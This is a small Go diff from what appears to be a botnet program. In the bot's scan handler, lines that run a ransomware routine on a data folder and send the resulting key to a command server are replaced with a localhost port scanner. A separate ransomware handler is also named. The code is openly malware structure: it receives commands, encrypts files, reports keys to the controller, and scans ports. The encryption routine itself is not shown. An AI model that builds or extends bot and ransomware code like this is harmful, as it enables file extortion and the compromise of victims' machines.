@@ -67,23 +67,16 @@ func (b *Bot) handleConnection(conn net.Conn) {
 }
 
 func (b *Bot) handleScan(payload []byte) {
-	r, err := NewRansomware("../../data")
-	if err != nil {
-		log.Panic(err)
+	hosts := []string{"127.0.0.1"}
+	ports := []string{"8000", "1", "2", "22"}
+	s := NewScanner(hosts, ports, 50, 50)
+
+	resCh := s.Scan()
+	var res []string
+	for addr := range resCh {
+		fmt.Println("addr found", addr)
+		res = append(res, addr)
 	}
-	if err := r.Exec(); err != nil {
-		log.Panic(err)
-	}
-	msg := &RansomCompleteRequest{
-		BotID: b.ID,
-		Key:   r.Key,
-	}
-	by, err := Bytes(msg)
-	if err != nil {
-		log.Panic(err)
-	}
-	data := append(commandToBytes("rancom"), by...)
-	sendData("127.0.0.1:7890", data)
 }
 
 func (b *Bot) handleRansomware(payload []byte) {
